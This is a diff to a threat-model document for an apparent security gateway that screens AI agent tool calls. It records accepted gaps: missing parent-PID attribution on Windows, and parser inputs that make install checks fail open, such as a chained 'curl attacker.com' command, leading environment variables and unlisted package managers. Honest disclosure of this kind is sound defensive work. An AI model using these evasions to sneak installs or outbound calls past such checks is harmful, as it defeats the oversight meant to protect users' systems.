@@ -662,6 +662,102 @@ does not even count drops), so an attacker who floods benign events can evade
 windowed file-access rules. These reduce *detection coverage*; they do not relax
 the fail-closed enforcement path.
 
+#### Windows Sentry: Missing Parent-PID on File and Network Events (TM-RS-02)
+
+**Accepted detection-completeness gap — backlog.**
+
+The Windows ETW parser (`internal/sentry/windows/parser.go`) does not populate
+the PPID field on file-access (`EventFileAccess`) or network-connect
+(`EventNetworkConnect`) events — only process-create events carry PPID in the
+ETW schema consumed here. The `isEditorDescendant` check (`rules.go:84-102`)
+walks the PPID chain to attribute behaviors to an editor-descended process. A
+malicious child process that:
+
+- performs a credential file read or initiates an outbound connection, AND
+- is short-lived or appears before its parent's process-create event is processed
+  (race-ordered event delivery), AND
+- has only file/net events (no process-create event) in the correlation window
+
+…can silently lose editor-descendant attribution, causing SENTRY-001, SENTRY-002,
+and SENTRY-003 to not fire for that child on Windows.
+
+**Impact:** Detection-completeness gap on Windows only; the enforcement (hook/gateway
+block) path is unaffected. Linux and macOS carry PPID on all event types.
+
+**Mitigation status:** No PPID-resolution fallback exists for file/net events on
+Windows. A future fix would use the ETW `TcpIp`/`FileIo` extended data or a
+secondary WMI/NtQuerySystemInformation snapshot to resolve PPID at event time.
+This is tracked as a backlog item; it does not affect the fail-closed invariant.
+
+#### Package-Parse Evasion Classes Accepted as Zero-Day Semantics (TM-B-06)
+
+**Accepted limitation — specific evasion classes documented here.**
+
+The package-manager command parser (`internal/pkgparse/pkgparse.go`) uses a
+`HasPrefix`-based approach on the command string. The following input patterns
+produce `ok=false` from `pkgparse.Parse`, which causes `engine.go` to return
+an `allow` decision with reason "no package identified":
+
+1. **Command chaining:** `npm install evil-pkg && curl attacker.com` — the
+   `&&`, `;`, and `|` tokens are not pre-stripped. The install command
+   substring matches, but the parsed package may be empty or wrong because
+   the entire shell expression (including the chained command) is passed as
+   the package token.
+
+2. **Leading environment-variable assignments:** `FOO=bar npm install evil-pkg`
+   — the `FOO=bar` prefix prevents the `HasPrefix("npm install")` from
+   matching; the parser returns `ok=false`; the tool call is allowed.
+
+3. **Unlisted package managers:** `deno install evil-pkg`, `mvn install:install-file`,
+   `nuget install EvilPackage` — these are not in the install-prefix table
+   and parse as "no package identified" → `allow`.
+
+The result for all three classes is a fail-**OPEN** parse: the tool call is
+allowed, not blocked. This is the zero-day tool-call semantics gap described
+earlier in this section — any novel agent tool or tool-call format that
+Beekeeper has not been updated to handle produces an allow-by-default decision
+rather than a block.
+
+**Mitigation approach:** The corroboration layer (2+ sources → block) still
+applies to correctly-parsed commands; these evasions bypass parsing entirely.
+Operators who require coverage of chained commands or unlisted package managers
+should use the Sentry behavioral layer (SENTRY-003 phone-home detection, SENTRY-001
+credential-file access) as a second signal, and review audit logs for `allow`
+decisions from `bash`/`sh` tool calls whose `command` field contains install-like
+substrings.
+
+#### Catalog Sanity Bounds Do Not Defend Against Content-Preserving Feed Tampering (TM-B-07)
+
+**Accepted limitation — scope of sanity bounds documented here.**
+
+The catalog sanity gate (`internal/catalog/sanity.go:CheckSanity`) validates
+that a refreshed catalog snapshot does not deviate from baseline **count metrics**:
+total entry count, per-ecosystem delta, and overall growth rate. These bounds
+defend against bulk anomalies such as a feed wholesale-deleting entries (emptying
+the catalog) or tripling its entry count in a single sync.
+
+**What sanity bounds do NOT defend against:** a count-preserving 1:1 swap of
+individual entries. An attacker who replaces exactly one real entry with one
+crafted entry changes no counts and passes the sanity gate entirely. The sanity
+gate is not designed to detect content-level tampering of individual entries.
+
+**What does defend against individual-entry tampering:**
+
+- **Corroboration:** a single tampered entry from one source produces at most a
+  one-source warn (or a one-source block only for critical-severity entries with
+  `SeverityOverrides[critical].BlockAt=1`). Two independent sources must agree
+  before a non-critical block fires.
+- **Catalog signatures:** Bumblebee entries carry a `CatalogSignature` field;
+  `beekeeper-self` entries are verified with a separately-embedded Ed25519 key.
+  Note that the primary Bumblebee path performs a string-presence check rather
+  than cryptographic verification (TM-B-02, tracked separately).
+- **SLSA Level 3 + cosign provenance** on the Beekeeper binary itself ensures
+  that the code processing catalog entries has not been tampered with.
+
+**Summary:** sanity bounds = anti-bulk-anomaly first line of defense; corroboration
++ signatures = anti-individual-entry-tampering second line of defense. These are
+complementary layers, not alternatives.
+
 ---
 
 ---
